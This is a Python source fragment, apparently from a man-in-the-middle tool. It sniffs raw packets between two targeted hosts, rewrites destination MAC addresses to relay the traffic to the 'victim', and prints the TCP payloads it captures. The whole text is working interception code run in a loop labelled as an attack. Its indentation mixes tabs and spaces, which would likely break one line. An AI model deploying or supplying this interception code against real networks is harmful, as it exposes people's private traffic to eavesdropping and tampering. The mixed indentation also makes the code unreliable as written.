def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_MAC):
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    s.bind(('enp0s3', socket.SOCK_RAW))

    while attacking:
        packet = s.recvfrom(65565)
        packet = packet[0]
        ethernet_length = 14
        eth_header = packet[:ethernet_length] #Ethernet header is 14 bytes
        unpacked_eth = unpack('>6s6sH', eth_header)
		#  unpacked_eth:
		#-----------------
		#  index:
        #   0 -  Destination MAC Address (48 bits)
        #   1 - Source MAC Address (48 bits)
        #   2 - EtherType (16 bits)

        ip_header = packet[ethernet_length:ethernet_length+20]
        unpacked_iph = unpack('>BBHHHBBH4s4s', ip_header)
        #  unpacked_iph:
        #-----------------
        #  index:
        #   0 -  Version [0000]  IP Header Length [0000] (8 bits)
        #   1 - Type of Service (8 bits)
        #   2 - Size of Datagram (16 bits)
        #   3 - Identification (16 bits)
        #   4 - Flags [000] Fragmentation Offset [13 bits] (16 bits)
        #   5 - TTL (8 bits)
        #   6 - Protocol (8 bits)
        #   7 - Checksum (16 bits)
        #   8 - Source IP (32 bits)
        #   9 - Destination IP (32 bits)

        ip_header_length = (unpacked_iph[0] & 0xF) * 4
        srcIP = socket.inet_ntoa(unpacked_iph[8])
        dstIP = socket.inet_ntoa(unpacked_iph[9])

		#Forward packet to victim
        new_dst_MAC = None
        if dstIP == Host_One_IP:
            new_dst_MAC = Host_One_MAC
        elif dstIP == Host_Two_IP:
            new_dst_MAC = Host_Two_MAC
		#Reconstruct packet with actual MAC
        if new_dst_MAC != None:
            new_packet = [new_dst_MAC,packet[6:]]
            s.send(b''.join(new_packet))

        ethAndIP_len = ethernet_length+ip_header_length
        tcp_header = packet[ethAndIP_len:ethAndIP_len+20]
        unpacked_tcp = unpack('>HHLLBBHHH', tcp_header)
        #  unpacked_tcp:
        #-----------------
        #  index:
        #   0 -  Source Port (16 bits)
        #   1 - Destination Port (16 bits)
        #   2 - Sequence Number (32 bits)
        #   3 - Acknowlegement Number (32 bits)
        #   4 - Data Offset [0000] Reserved [0000] (8 bits)
        #   5 - Reserved [00] Control Bits [000000] (8 bits)
        #   6 - Window (16 bits)
        #   7 - Checksum (16 bits)
        #   8 - Urgent Pointer (16 bits)

        srcPort = unpacked_tcp[0]
        dstPort = unpacked_tcp[1]
        tcp_header_length = (unpacked_tcp[4] >> 4) * 4

        header_size = ethAndIP_len + tcp_header_length

        data = packet[header_size:]
		data = unpack('>' + str(len(data)) + 's',data)

        if srcIP == Host_One_IP or srcIP == Host_Two_IP or dstIP == Host_One_IP or dstIP == Host_Two_IP:
            print('SrcIP: ' + str(srcIP) + ' SrcPort: ' + str(srcPort) + ' DestIP: ' + str(dstIP) + ' DestPort: ' + str(dstPort) + '\nData: ' + str(data))

# Starts the packet sniffer thread
def start_sniffer():
	Thread(target=listen_to_incoming_packets, args=(ip1, ip2, mac1, mac2)).start()